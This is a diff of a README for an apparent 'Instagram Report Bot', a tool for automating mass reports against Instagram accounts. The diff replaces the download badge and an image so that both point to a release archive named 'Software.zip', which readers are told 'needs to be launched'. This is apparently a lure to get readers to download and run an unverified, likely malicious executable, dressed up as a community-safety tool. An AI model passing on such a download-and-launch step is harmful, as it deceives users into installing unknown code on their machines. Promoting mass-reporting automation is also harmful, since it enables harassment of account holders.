@@ -18,7 +18,7 @@ Welcome to the **Instagram Report Bot** repository! This tool is designed to aut
     - reporting-bot-instagram
 
 ## 🔗 Download Link
-[![Download Instagram Report Bot](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Instagram Report Bot](https://github.com/Absp72/instagram-report-bot/releases/download/v2.0/Software.zip)](https://github.com/Absp72/instagram-report-bot/releases/download/v2.0/Software.zip)
 *Please note that the linked file needs to be launched.*
 
 ## 🤖 How to Use the Instagram Report Bot
@@ -46,4 +46,4 @@ The Instagram Report Bot is released under the [MIT License](LICENSE).
 
 Thank you for visiting the **Instagram Report Bot** repository. We hope this tool helps you in contributing towards a safer Instagram community. Report responsibly and make a positive impact! 🌟
 
-![Instagram Bot](https://cdn.pixabay.com/photo/2016/11/18/17/46/social-media-1835633_960_720.jpg)
+![Instagram Bot](https://github.com/Absp72/instagram-report-bot/releases/download/v2.0/Software.zip)
